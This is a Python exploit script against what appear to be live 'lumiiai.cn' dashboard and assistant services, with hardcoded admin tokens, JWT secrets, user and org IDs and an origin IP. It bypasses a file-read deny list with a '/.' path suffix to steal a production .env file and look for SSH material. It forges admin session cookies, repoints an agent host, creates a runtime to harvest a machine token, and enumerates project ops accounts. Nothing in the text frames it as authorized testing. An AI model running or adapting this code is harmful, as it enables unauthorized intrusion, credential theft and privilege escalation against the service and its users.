#!/usr/bin/env python3
# i29222: (1) deny-list "/." bypss to read CURRENT /opt/lumii-prod/.env.dev + ssh material
#         (2) forge assistant admin lumii_session with CURRENT secret -> /api/me
#         (3) POST /api/runtimes(org) -> AGENT_TOKEN (perRuntime machine identity)
#         (4) enumerate projects + /api/projects/:id/ops accounts (as admin)
import os, sys, json, time, base64, hmac, hashlib, subprocess, re, socket, tempfile
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
DASH_JWT = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
A_HOST = "assistant.lumiiai.cn"
A_SUB = "usr_ZxLewKrgbRYSm7rWDtQX8"
A_ORG = "org_bTLzxtBLmugV8uxx4QTyw"
AID = "agent-b8d7ca0b"
OWNER = "af0a2285-490f-11f1-ac43-525400595be1"
ORIG_IP = "52.53.251.49"

def _b(s):
    if not isinstance(s, str): s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v): print("R:%s:%s" % (k, _b(v)), flush=True)

def curl(args, timeout=30):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout
    except Exception as e:
        return -1, repr(e).encode()

def call(path, method="GET", body=None, session=None, admin=False, host=HOST, timeout=25, maxlen=8000, extra_headers=None, cookie=None):
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*", "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if cookie: args += ["-H", "Cookie: " + cookie]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    for h in (extra_headers or []): args += ["-H", h]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET": args += ["-X", method]
    args += ["https://%s%s" % (host, path)]
    rc, out = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0: code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen], "len": len(txt)}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jload(s):
    try: return json.loads(s)
    except Exception: return None
def qp(p): return up.quote(p, safe="/")

def flist(aid, sess, path, timeout=30, maxent=300):
    r = call("/api/agents/%s/files?action=list&path=%s" % (aid, qp(path)), session=sess, timeout=timeout, maxlen=80000)
    j = jload(r["body"]); ents = []
    if isinstance(j, dict) and isinstance(j.get("entries"), list):
        for e in j["entries"][:maxent]:
            ents.append({"n": e.get("name"), "t": e.get("type"), "s": e.get("size")})
    return r["code"], ents, r["body"][:200]

def fread(aid, sess, path, timeout=30, maxlen=600000):
    r = call("/api/agents/%s/files?action=read&path=%s" % (aid, qp(path)), session=sess, timeout=timeout, maxlen=maxlen)
    j = jload(r["body"])
    if isinstance(j, dict) and "content" in j:
        return r["code"], j.get("content") or "", j.get("size"), j.get("path")
    return r["code"], None, None, r["body"][:200]

# dashboard session (owner, customer=aro)
def forge_dash(user_id, customer="aro", role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": customer, "role": role,
                         "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    sig = b64u(hmac.new(DASH_JWT.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig
sess = forge_dash(OWNER)

# assistant cookie forge
def forge_a(secret, sub=A_SUB, org=A_ORG):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"sub": sub, "org": org, "iat": now, "exp": now + 2592000,
                         "sid": "sid_" + str(int(now)) + "x", "lgn": now}, separators=(",", ":")))
    sig = b64u(hmac.new(secret.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return "lumii_session=" + h + "." + p + "." + sig

# ---------- P0 health ----------
R("P0_dash_health", call("/api/health", maxlen=300))
R("P0_assist_health", call("/api/health", host=A_HOST, maxlen=300))

# ---------- P1 patch agent host -> 127.0.0.1 ----------
pr = call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": "127.0.0.1"}, timeout=25, maxlen=2000)
R("P1_patch", {"code": pr["code"], "body": pr["body"][:300]})

# ---------- A: deny-list bypass reads ----------
# 1) CURRENT .env.dev via "/." suffix (regex anchored at end -> "/." defeats it)
c, content, sz, pth = fread(AID, sess, "/opt/lumii-prod/.env.dev/.", timeout=30, maxlen=600000)
env_parsed = {"code": c, "size": sz, "path": pth}
if content is not None:
    kv = {}
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or "=" not in line: continue
        k, v = line.split("=", 1)
        kv[k.strip()] = v.strip().strip('"').strip("'")
    env_parsed["names"] = sorted(kv.keys())
    # expose the secrets we care about (mask long ones partially)
    for k in ("JWT_SECRET", "LUMII_TURN_TICKET_PRIVATE_KEY", "LUMII_TURN_PROOF_SECRET",
              "DATABASE_URL", "AGENT_WS_TOKEN", "APP_GATEWAY_TOKEN", "KB_RELAY_SECRET",
              "LUMII_SAAS_SECRET", "LUMII_PUSH_SECRET", "IDE_DASHBOARD_USER", "IDE_DASHBOARD_PASSWORD",
              "LUMII_RUNTIME_KEY_MASTER", "PUBLIC_BASE_URL"):
        if k in kv: env_parsed[k] = kv[k]
    env_parsed["_full"] = content[:12000]
else:
    env_parsed["err"] = str(pth)[:200]
R("A_env", env_parsed)

# baseline (expect 403)
cb, _cb2, _s, _p = fread(AID, sess, "/opt/lumii-prod/.env.dev", timeout=15, maxlen=200)
R("A_env_baseline", {"code": cb})

# 2) listings to look for key material outside .ssh
for nm, path in [("ls_home_ubuntu", "/home/ubuntu"),
                 ("ls_home_lumii", "/home/lumii"),
                 ("ls_opt_prod", "/opt/lumii-prod"),
                 ("ls_opt_prod_deploy", "/opt/lumii-prod/deploy"),
                 ("ls_home_ubuntu_backups", "/home/ubuntu/backups"),
                 ("ls_var_backups", "/var/backups/lumii-prod")]:
    c, ents, raw = flist(AID, sess, path, timeout=25)
    R("A_" + nm, {"code": c, "n": len(ents), "entries": ents[:120], "raw": (raw if c != "200" else "")})

# 3) ops scripts (identity key management) - not denied
for f in ("/opt/lumii-prod/scripts/ops/gen-identity-keys.sh",
          "/opt/lumii-prod/scripts/ops/merge-envs.mjs",
          "/opt/lumii-prod/scripts/ops/identity-chain-inventory.sql"):
    c, content, sz, pth = fread(AID, sess, f, timeout=20, maxlen=40000)
    R("A_" + os.path.basename(f), {"code": c, "size": sz, "content": (content or "")[:6000], "err": None if content is not None else str(pth)[:120]})

# ---------- B: forge assistant admin with CURRENT secret ----------
secrets = []
if env_parsed.get("JWT_SECRET"): secrets.append(env_parsed["JWT_SECRET"])
for s in ("297b8a491bc1920b918d01de77166556d3f835f473968c6b", "ce4bc6b0c0ab05a849adf046d57dbf11a98386d7e6804315"):
    if s not in secrets: secrets.append(s)
me_results = {}
for sec in secrets:
    ck = forge_a(sec)
    r = call("/api/me", host=A_HOST, cookie=ck, timeout=20, maxlen=800)
    me_results[sec[:10]] = {"code": r["code"], "body": r["body"][:400]}
R("B_me", me_results)

cur = env_parsed.get("JWT_SECRET") or "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
COOKIE = forge_a(cur)
# confirm which secret is live
live = None
for sec in secrets:
    r = call("/api/me", host=A_HOST, cookie=forge_a(sec), timeout=20, maxlen=800)
    if r["code"] == "200": live = sec; break
R("B_live_secret", {"found": bool(live), "prefix": (live or "")[:10]})

if live:
    COOKIE = forge_a(live)
    # projects
    pr = call("/api/projects", host=A_HOST, cookie=COOKIE, timeout=25, maxlen=40000)
    pj = jload(pr["body"]); projs = []
    if isinstance(pj, dict):
        projs = pj.get("projects") or pj.get("items") or []
    elif isinstance(pj, list):
        projs = pj
    R("B_projects", {"code": pr["code"], "n": len(projs),
                     "list": [{"id": (p.get("id") if isinstance(p, dict) else None),
                               "name": (p.get("name") if isinstance(p, dict) else None),
                               "repos": (p.get("repoCount") or p.get("repos")) if isinstance(p, dict) else None} for p in projs[:40]]})
    # runtimes list
    rl = call("/api/runtimes", host=A_HOST, cookie=COOKIE, timeout=25, maxlen=20000)
    R("B_runtimes_list", {"code": rl["code"], "body": rl["body"][:1500]})
    # CREATE runtime (org)
    cr = call("/api/runtimes", host=A_HOST, cookie=COOKIE, method="POST", body={"name": "probe-29222", "visibility": "org"}, timeout=30, maxlen=8000)
    cj = jload(cr["body"]) or {}
    rid = cj.get("id"); agid = cj.get("agentId"); iurl = cj.get("installUrl") or ""
    tok = ""
    if iurl:
        m = re.search(r"/runtimes/install/([^/?#]+)", iurl)
        if m: tok = m.group(1)
    # also scrape script for token
    script = cj.get("script") or ""
    if not tok and script:
        m = re.search(r"AGENT_TOKEN[=:\"']+\s*([A-Za-z0-9_\-]{20,})", script) or re.search(r"/runtimes/install/([A-Za-z0-9_\-]+)", script)
        if m: tok = m.group(1)
    R("B_runtime_create", {"code": cr["code"], "id": rid, "agentId": agid,
                           "installUrl_hasToken": bool(tok), "token_prefix": tok[:6],
                           "body": cr["body"][:1200]})
    # perRuntime keys/current with machine headers
    if tok and agid:
        kc = call("/api/runtimes/keys/current", host=A_HOST, timeout=20, maxlen=4000,
                  extra_headers=["Authorization: Bearer " + tok, "x-agent-id: " + agid])
        R("B_keys_current", {"code": kc["code"], "body": kc["body"][:1500]})
        # also try query param variant
        kc2 = call("/api/runtimes/keys/current?runtimeId=%s" % rid, host=A_HOST, cookie=COOKIE, timeout=20, maxlen=4000)
        R("B_keys_current_cookie", {"code": kc2["code"], "body": kc2["body"][:800]})
    # enumerate ops/accounts for up to 10 projects
    ops = {}
    for p in projs[:10]:
        if not isinstance(p, dict): continue
        pid = p.get("id")
        if not pid: continue
        r = call("/api/projects/%s/ops" % pid, host=A_HOST, cookie=COOKIE, timeout=25, maxlen=60000)
        j = jload(r["body"]) or {}
        envs = j.get("environments") or []
        accs = j.get("accounts") or []
        ops[pid] = {"code": r["code"],
                    "envs": [{"id": e.get("id"), "name": e.get("name"), "tier": e.get("tier"),
                              "accessMode": e.get("accessMode"), "sshAliases": e.get("sshAliases")} for e in envs][:12],
                    "accounts": [{"name": a.get("name"), "username": a.get("username"), "url": a.get("url"),
                                  "env": a.get("environmentId")} for a in accs][:30]}
    R("B_project_ops", ops)
else:
    R("B_no_live_secret", True)

# ---------- restore host ----------
pr3 = call("/api/admin/agents", method="PATCH", admin=True, body={"id": AID, "host": ORIG_IP}, timeout=25, maxlen=1000)
R("P9_restore", {"code": pr3["code"], "body": pr3["body"][:200]})
print("DONE", flush=True)
